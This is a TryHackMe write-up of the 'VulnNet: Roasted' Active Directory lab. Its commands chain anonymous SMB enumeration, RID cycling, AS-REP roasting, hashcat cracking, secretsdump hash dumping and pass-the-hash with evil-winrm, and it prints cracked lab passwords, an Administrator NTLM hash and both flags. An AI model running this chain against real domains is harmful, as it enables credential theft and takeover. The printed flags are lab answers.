# VulnNet: Roasted (TryHackMe) — Full Walkthrough

## Overview

* **Difficulty:** Easy
* **Platform:** TryHackMe
* **Focus Areas:** Active Directory Enumeration, SMB, Kerberos, AS-REP Roasting, Lateral Movement, Privilege Escalation

This writeup walks through my full approach to compromising the **VulnNet: Roasted** machine. The box revolves around Active Directory misconfigurations, particularly around user enumeration and Kerberos abuse.

---

## Initial Recon

As always, I started with a full port scan using Nmap:

```bash
nmap -sC -sV -Pn 10.146.188.199
```
![Nmap Scan](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Nmap%20Scan.png)

### Key Findings

The scan revealed several important services:

* Kerberos (88)
* LDAP (389)
* SMB (445)

This immediately suggested an Active Directory environment, so my focus shifted toward domain enumeration and credential harvesting.

---

## SMB Enumeration (Anonymous Access)

I checked for anonymous SMB access:

```bash
smbclient -L //10.146.188.199 -N
```
![Anonymous SMB Login](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Anonymous%20SMB%20Login.png)


Anonymous login was allowed, and I was able to list available shares.

I connected to accessible shares and downloaded files:

```bash
smbclient //10.146.188.199/VulnNet-Business-Anonymous -N
smbclient //10.146.188.199/VulnNet-Enterprise-Anonymous -N
```
![Extracting Anonymous Share Data](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Smbclient%20Anonymous%20Share%20Data.png)

![Extracting Anonymous Share Data](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Smbclient%20Anonymous%20Share%20Data-1.png)

### Findings

* Discovered files containing potential usernames
* Created a custom username wordlist from gathered data

![Anonymous Share's Data](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Business%20Files%20Content.png)

![Anonymous Share's Data](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Enterprise%20File%20Content.png)

---

## Kerberos Attacks — First Attempt

With usernames in hand, I attempted AS-REP Roasting:

```bash
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip 10.146.188.199 -usersfile users.txt
```
![AS-REP Roasting](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/AS-REP%20Roasting.png)

❌ No luck — none of the users had **"Do not require Kerberos preauthentication"** enabled.

Next, I tried validating usernames using Kerbrute:

```bash
kerbrute userenum -d vulnnet-rst.local --dc 10.146.181.101 users.txt
```

![Kerbrute Username Enumeration](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Kerbrute%20Username%20Enumeration.png)

❌ Still no success — no valid usernames confirmed.

---

## SID Enumeration (Breakthrough)

At this point, I pivoted to RID cycling using Impacket:

```bash
impacket-lookupsid anonymous@10.146.181.101
```

![SID Enumeration](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/SID%20Enumeration.png)

✅ This worked and revealed valid domain users.

This was a key turning point — the earlier username list was incomplete.

---

## AS-REP Roasting — Success

Using the newly discovered usernames:

```bash
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip 10.146.181.101 -usersfile username.txt
```

![Successful AS-REPRoasting](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/ASREP%20Success.png)

✅ Successfully retrieved a Kerberos AS-REP hash for one user.

---

## Cracking the Hash

I used Hashcat to crack the hash:

```bash
hashcat -m 18200 hash.txt rockyou.txt
```

![Successful Hash Cracking using Hashcat](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Successful%20Hash%20Cracking%20using%20Hashcat.png)

✅ Password recovered successfully.

---

## SMB Access with Credentials

With valid credentials:

```bash
smbmap -H 10.146.181.101 -u t-skid -p tj072889*
```

![Smbmap Listing Share Permissions](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Smbmap%20Listing%20Share%20Permissions.png)

### Findings

* Access to additional shares with read permissions

I connected to those shares:

```bash
smbclient //10.146.181.101/NETLOGON -U t-skid
```

![NETLOGON Share Data Extraction](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/NETLOGON%20Share%20Data%20Extraction.png)


### Results

* Found files containing credentials for another user

![Found Hardcoded Credentials](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Harcoded%20Credentials.png)

---

## Lateral Movement

Using the second set of credentials:

```bash
smbmap -H 10.146.181.101 -u a-whitehat -p bNdKVkjv3RR9ht
```

![Smbmap Listing Share Permission](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Smbmap%20Listing%20Share%20Permissions-1.png)

Then tried to access ADMIN$ and C$ shares:

```bash
smbclient //10.146.181.101/C$ -U a-whitehat
```

![C$ Share Data Access](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/C%24%20Share%20Data%20Access.png)

![User Flag File](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/User%20Flag%20File.png)

### Outcome

* Access to more sensitive data

![User Flag](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/User%20Flag.png)

* Retrieved the user flag

```
User Flag: THM{726b7c0baaac1455d05c827b5561f4ed}
```

---

## Privilege Escalation

Next, I attempted to dump hashes:

```bash
impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.146.181.101
```

![Hash Dumping](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Hash%20Dumping.png)

✅ Successfully dumped hashes, including the Administrator hash.

---

## Attempted Hash Cracking

```bash
hashcat -m 1000 admin_hash.txt rockyou.txt
```

![Hash Cracking using Hashcat](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Hash%20Cracking%20using%20Hashcat.png)

❌ Failed — password not crackable via wordlist.

---

## Pass-the-Hash Attempts

Tried using Impacket PsExec:

```bash
impacket-psexec administrator@10.146.181.101 -hashes :c2597747aa5e43022a3a3049a3c3b09d
```

![Pass-the-Hash using Psexec](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Pass-the-Hash%20using%20Psexec.png)

❌ Failed

Then tried Evil-WinRM:

```bash
evil-winrm -i 10.146.173.32 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
```

![Pass-the-Hash using Evil-WinRM](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/Pass-the-Hash%20using%20Evil-WinRM.png)

✅ Success! Gained Administrator access.

---

## Final Step

Once inside:

```bash
cat C:\Users\Administrator\Desktop\system.txt
```

![System Flag](https://github.com/virtualISP/Writeups/blob/main/TryHackMe/VulnNet/VulnNet-Roasted/images/System%20Flag.png)

🎉 Retrieved the root flag:

```
System Flag: THM{16f45e3934293a57645f8d7bf71d8d4c}
```

---

## Key Takeaways

* Anonymous SMB access can leak valuable intel
* RID cycling (`lookupsid`) is extremely useful when username lists fail
* AS-REP roasting is powerful when pre-auth is disabled
* Always check for credential reuse across shares
* Pass-the-Hash may work differently depending on the tool — don’t rely on just one

---

## Tools Used

* Nmap
* smbclient
* smbmap
* Kerbrute
* Impacket suite:

  * GetNPUsers
  * lookupsid
  * secretsdump
  * psexec
* Hashcat
* Evil-WinRM

---

## Conclusion

This machine highlights the importance of thorough enumeration and persistence. Initial attempts may fail, but alternative techniques like SID enumeration can uncover new attack paths.

If you're preparing for OSCP or similar certifications, this box is excellent practice for:

* Active Directory attacks
* Kerberos abuse
* Lateral movement strategies
